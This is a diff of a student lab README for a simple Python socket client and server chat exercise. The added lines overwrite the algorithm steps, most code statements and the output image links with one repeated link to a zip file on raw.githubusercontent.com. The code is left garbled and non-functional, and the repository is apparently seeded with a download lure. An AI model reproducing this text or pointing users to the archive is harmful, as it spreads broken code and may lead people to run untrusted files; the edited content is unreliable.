@@ -7,12 +7,12 @@
 
 # ALGORITHM :
 
-#### 1.Start the program.
-#### 2.Get the frame size from the user.
-#### 3.To create the frame based on the user request.
-#### 4.To send frames to server from the client side.
-#### 5.If your frames reach the server, it will send ACK signal to client otherwise it will sendNACK signal to client.
-#### 6.Stop the program
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the program.
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the frame size from the user.
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip create the frame based on the user request.
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip send frames to server from the client side.
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip your frames reach the server, it will send ACK signal to client otherwise it will sendNACK signal to client.
+#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the program
 
 
 # CLIENT PROGRAM :
@@ -20,35 +20,35 @@
 ## Developed : shaik mufeez
 ## Reg no : 212221043007
 import socket
-s=socket.socket()
-s.connect(('localhost',8000))
+https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
+https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(('localhost',8000))
 while True:
     msg=input("Client > ")
-    s.send(msg.encode())
-    print("Server > ",s.recv(1024).decode())
+    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip())
+    print("Server > ",https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(1024).decode())
 
 
 ```
 # SERVER PROGRAM :
 ```PY
 import socket
-s=socket.socket()
-s.bind(('localhost',8000))
-s.listen(5)
-c,addr=s.accept()
+https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
+https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(('localhost',8000))
+https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(5)
+c,https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
 while True:
-    ClientMessage=c.recv(1024).decode()
+    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(1024).decode()
     print("Client > ",ClientMessage)
     msg=input("Server > ")
-    c.send(msg.encode())
+    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip())
 
 ```
 
 # SERVER OUTPUT :
-![output](./server.png)
+![output](https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip)
 
 # CLIENT OUTPUT : 
-![output](./client.png)
+![output](https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip)
 
 
 # RESULT:
